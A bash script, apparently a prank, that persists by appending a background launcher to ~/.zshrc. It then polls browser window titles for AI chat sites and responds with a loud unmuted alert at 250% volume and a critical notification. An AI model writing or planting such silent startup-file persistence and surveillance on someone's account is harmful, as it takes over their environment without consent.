#!/bin/bash
# nohup /sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh > /dev/null 2>&1 &
if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/detect.sh" ~/.zshrc 2>/dev/null; then
    cat << EOF >> ~/.zshrc
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/detect.sh > /dev/null 2>&1 &!
EOF
fi

XDOTOOL_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/bin/xdotool"
export LD_LIBRARY_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH"
if [ ! -x "$XDOTOOL_PATH" ]; then
    exit 1
fi

check_chrome() {
    chrome_windows=$($XDOTOOL_PATH search --class "Google-chrome" 2>/dev/null)
    
    if [ -n "$chrome_windows" ]; then
        for window_id in $chrome_windows; do
            window_title=$($XDOTOOL_PATH getwindowname "$window_id" 2>/dev/null)
            
            if echo "$window_title" | grep -iq "chatgpt\|claude\|copilot\|gemini\|bard\|openai"; then
                return 0
            fi
        done
    fi
    return 1
}

check_firefox() {
    firefox_windows=$($XDOTOOL_PATH search --class "Firefox" 2>/dev/null)
    
    if [ -n "$firefox_windows" ]; then
        for window_id in $firefox_windows; do
            window_title=$($XDOTOOL_PATH getwindowname "$window_id" 2>/dev/null)
            
            if echo "$window_title" | grep -iq "chatgpt\|claude\|copilot\|gemini\|bard\|openai"; then
                return 0
            fi
        done
    fi
    return 1
}

play_alert_sound() {
    local sound_file="/sgoinfre/goinfre/Perso/mochamsa/wav/alert.wav"
    pactl set-sink-mute @DEFAULT_SINK@ 0
    pactl set-sink-volume @DEFAULT_SINK@ 250%
    if [ -f "$sound_file" ]; then
        if command -v paplay &> /dev/null; then
            paplay "$sound_file" &
        fi
    fi
    sleep 10
}

show_notification() {
    local message="$1"
    
    if command -v notify-send &> /dev/null; then
        notify-send "🚨 Détection D'IA" "$message" --urgency=critical --icon=dialog-warning
    fi
    
}

show_message() {
    local message="$1"
}

main() {
    
    chrome_found=false
    firefox_found=false
    
    if check_chrome; then
        chrome_found=true
    fi
    
    if check_firefox; then
        firefox_found=true
    fi
    
    if [ "$chrome_found" = true ] || [ "$firefox_found" = true ]; then
        show_notification "⚠️ ALERTE: IA détectée dans votre navigateur!"
        play_alert_sound
        return 0
    else
        return 1
    fi
}

monitor_mode() {
    local interval=${1:-30}    
    while true; do
        if main; then
            sleep 1
        else
            sleep 1
        fi
    done
}

monitor_mode 30
